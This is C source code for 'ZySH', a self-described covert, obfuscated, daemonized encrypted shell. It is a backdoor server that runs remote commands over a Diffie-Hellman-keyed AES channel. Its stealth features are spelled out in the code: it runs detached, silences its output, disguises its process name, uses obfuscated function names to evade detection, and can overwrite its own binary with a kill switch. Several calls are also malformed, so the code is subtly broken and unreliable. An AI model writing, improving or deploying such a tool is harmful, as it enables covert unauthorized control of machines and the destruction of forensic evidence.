/* 

ZySH - A covert, obfuscated, daemonized, encrypted shell

Remember to compile this with the -lcrypto flag 
to link against the OpenSSL library: gcc server.c -lcrypto -o server 

Written by Zyy 

KEY FUNCTIONALITY
- Encrypted sockets (dynamically generated encryption keys w/ client server key exchange)
- Built-in commands for host server manipulation
- Self-destruct feature (3-pass randomized overwrite)
- Daemonized to run in the background
- STDERR and STDOUT routed to /dev/null to increase stealth
- Process name disguised as generic (can also be renamed remotely)
- Killswitch to quickly terminate the server quietly
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/dh.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <time.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
#include <linux/hdreg.h>

#define MAX_CMD_LEN 1024
#define PORT 99
#define PASS_COUNT 3
#define BUFFER_SIZE 4096

struct CipherContext {

    EVP_CIPHER_CTX *encryptCtx;
    EVP_CIPHER_CTX *decryptCtx;

};

void silently_terminate_process(struct CipherContext *cipherCtx) {
    
    // Clean up cipher contexts before terminating
    EVP_CIPHER_CTX_free(cipherCtx->encryptCtx);
    EVP_CIPHER_CTX_free(cipherCtx->decryptCtx);

    _exit(0); 
}

// Self-explanatory, but lots of code, so comments make cleaner or more understandable
char* get_current_executable_name() {

    char* buffer = NULL;
    ssize_t buffer_size = 0;

    // Get the size of the buffer required to store the executable path
    buffer_size = readlink("/proc/self/exe", NULL, 0);

    if (buffer_size == -1) {

        perror("Error getting executable path size");
        return NULL;
    }

    // Allocate memory to store the executable path
    buffer = (char*)malloc(buffer_size + 1);
    if (buffer == NULL) {

        perror("Memory allocation error");
        return NULL;
    }

    // Read the executable path into the buffer
    ssize_t result = readlink("/proc/self/exe", buffer, buffer_size);
    if (result == -1) {

        perror("Error getting executable path");
        free(buffer);
        return NULL;
    }

    // Null-terminate the buffer
    buffer[result] = '\0';

    return buffer;
}

// Functions for self-destruction
void generate_random_data(char *buffer, size_t size) {

    for (size_t i = 0; i < size; i++) {
        buffer[i] = rand() % 256; // Generate random bytes
    }

}


void shred_file(const char *filename) {

    FILE *file = fopen(filename, "r+b");
    if (file == NULL) {
        perror("Error opening the file");
        return;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);

    char buffer[BUFFER_SIZE];

    // Perform multiple passes to shred the file
    for (int pass = 0; pass < PASS_COUNT; pass++) {
        rewind(file);

        for (long written_bytes = 0; written_bytes < file_size; written_bytes += BUFFER_SIZE) {
            size_t bytes_to_write = BUFFER_SIZE;
            if (written_bytes + bytes_to_write > file_size) {
                bytes_to_write = file_size - written_bytes;
            }

            generate_random_data(buffer, bytes_to_write);
            fwrite(buffer, sizeof(char), bytes_to_write, file);
        }
    }

    fclose(file);
    printf("File shredded successfully.\n");

}

void handleErrors(void) {

    ERR_print_errors_fp(stderr);
    abort();
}

// Change process name, function name obfuscated to mitigate reverse engineering and signature-based detection
void cpn(int new_socket, unsigned char* decrypted_command) {

    if (decrypted_command == NULL || strlen(decrypted_command) == 0) {

        // No input, error obfuscated
        send(new_socket, "Fail. Code 001-Ni", 20, 0);
        return;
    }
    if (prctl(PR_SET_NAME, decrypted_command, NULL, NULL, NULL) != 0) {

        // Miscellaneous failure
        send(new_socket, "Fail.", 20, 0);

    } else {

        send(new_socket, "Success.", 20, 0);

    }

}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
  unsigned char *iv, unsigned char *ciphertext, struct CipherContext *cipherCtx) {

    int len;
    int ciphertext_len;

    if(1 != EVP_EncryptInit_ex(cipherCtx->encryptCtx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    if(1 != EVP_EncryptUpdate(cipherCtx->encryptCtx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;

    if(1 != EVP_EncryptFinal_ex(cipherCtx->encryptCtx, ciphertext + len, &len)) handleErrors();
    ciphertext_len += len;

    return ciphertext_len;
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
  unsigned char *iv, unsigned char *plaintext, struct CipherContext *cipherCtx) {

    int len;
    int plaintext_len;

    if(1 != EVP_DecryptInit_ex(cipherCtx->decryptCtx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    if(1 != EVP_DecryptUpdate(cipherCtx->decryptCtx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    if(1 != EVP_DecryptFinal_ex(cipherCtx->decryptCtx, plaintext + len, &len)) handleErrors();
    plaintext_len += len;

    return plaintext_len;

}

void execute_cmd(int new_socket, unsigned char* shared_secret, unsigned char* cmd, struct CipherContext *cipherCtx) {

    FILE* fp;
    unsigned char output[MAX_CMD_LEN], encrypted_output[MAX_CMD_LEN];
    unsigned char iv[16] = {0}; // Initialization vector

    // internal cmds 
    if (cmd[0] == '!') {

        if (strncmp(cmd, "!procname", 9) == 0) {
            
            unsigned char* nn = cmd + 10; // get ARRGGG *angry pirate noise* (sorry)
            cpn(new_socket, nn);
            
        } else if (strncmp(cmd, "!kill", 5) == 0) {
            
            silently_terminate_process(cipherCtx);

        } else if (strncmp(cmd, "!sd", 3) == 0) {

            shred_file(get_current_executable_name());
            silently_terminate_process(cipherCtx);
            
        } else {

            // Invalid command starting with "!"
            send(new_socket, "Fail. Code 104-iCRTC", 16, 0);
        }

    } else {

        // Regular command execution
        if (fork() == 0) {
            fp = popen(cmd, "r");
            if (fp == NULL) {
                perror("popen failed");
                exit(EXIT_FAILURE);
            }

            while (fgets(output, sizeof(output) - 1, fp) != NULL) {
                int len = encrypt(output, strlen(output), shared_secret, iv, encrypted_output, &cipherCtx);
                send(new_socket, encrypted_output, len, 0);
            }

            pclose(fp);
            exit();
        }

        wait(NULL); // Make sure child process finishes before the parent continues

    }
}

void daemonize() {

    pid_t pid;

    // Fork off the parent process
    pid = fork();

    // An error occurred
    if (pid < 0) {
        exit();
    }

    // Success: Let the parent terminate
    if (pid > 0) {
        exit();
    }

    // On success: The child process becomes session leader
    if (setsid() < 0) {
        exit();
    }

    // Fork off for the second time
    pid = fork();

    // An error occurred
    if (pid < 0) {
        exit();
    }

    // Success: Let the parent terminate
    if (pid > 0) {
        exit();
    }

    // Set new file permissions
    umask(0);

    // Change the working directory to the root directory
    // or another appropriated directory
    chdir("/");

    // Close all open file descriptors
    int x;
    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--) {
        close (x);
    }

    // Redirect stdout and stderr to /dev/null for increased stealth
    int fd = open("/dev/null", O_RDWR);

    if (fd != -1) {
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);

        if (fd > 2) {
            close(fd);
        }
    }
}

int main() {

    // Prepare struct for ciphers
    struct CipherContext cipherCtx;

    // Initialize cipher contexts once
    cipherCtx.encryptCtx = EVP_CIPHER_CTX_new();
    cipherCtx.decryptCtx = EVP_CIPHER_CTX_new();

    // MAN-Handle those bad boys \-(*>_<*)-/
    if(!cipherCtx.encryptCtx || !cipherCtx.decryptCtx) {
        handleErrors();
    }
    
    unsigned char buffer[MAX_CMD_LEN], decrypted_command[MAX_CMD_LEN]; 
    unsigned char iv[16] = {0}; // Initialization vector
    int server_fd, new_socket;
    struct sockaddr_in address;
    socklen_t addrlen = sizeof(address);

    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {
        perror("listen failed");
        exit(EXIT_FAILURE);
    }

    daemonize();

    // Set the process name
    prctl(PR_SET_NAME, "worker", NULL, NULL, NULL);

    while (1) {
        printf("\nListening for incoming connections...\n");

        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) < 0) {
            perror("accept failed");
            exit(EXIT_FAILURE);
        }

        // Begin Diffie-Hellman Key exchange
        DH *dh = DH_new();
        if (dh == NULL) {
            perror("Failed to create new DH");
            exit(EXIT_FAILURE);
        }

        if (!DH_generate_parameters_ex(dh, 2048, DH_GENERATOR_2, NULL)) {
            perror("Failed to generate DH parameters");
            exit(EXIT_FAILURE);
        }

        unsigned char *pubkey = malloc(DH_size(dh));
        int len = DH_size(dh);

        if (!DH_generate_key(dh)) {
            perror("Failed to generate DH key");
            exit(EXIT_FAILURE);
        }

        if ((len = BN_bn2bin(DH_get0_pub_key(dh), pubkey)) == 0) {
            perror("Failed to get DH public key");
            exit(EXIT_FAILURE);
        }

        // Send public key to the client
        write(new_socket, pubkey, len);

        unsigned char *client_pubkey = malloc(DH_size(dh));
        // Receive client's public key
        read(new_socket, client_pubkey, DH_size(dh));

        unsigned char *shared_secret = malloc(DH_size(dh));
        int shared_secret_size;

        if ((shared_secret_size = DH_compute_key(shared_secret, BN_bin2bn(client_pubkey, len, NULL), dh)) == -1) {
            perror("Failed to compute shared secret");
            exit(EXIT_FAILURE);
        }

        DH_free(dh);

        while (1) {
            memset(buffer, 0, sizeof(buffer));
            memset(decrypted_command, 0, sizeof(decrypted_command));

            if (read(new_socket, buffer, sizeof(buffer)) <= 0) {
                break;
            }

            decrypt(buffer, strlen(buffer), shared_secret, iv, decrypted_command, &cipherCtx);

            execute_cmd(new_socket, shared_secret, decrypted_command);
        }

        close(new_socket);
    }

    // Clean up once
    EVP_CIPHER_CTX_free(cipherCtx.encryptCtx);
    EVP_CIPHER_CTX_free(cipherCtx.decryptCtx);

    return 0;
}
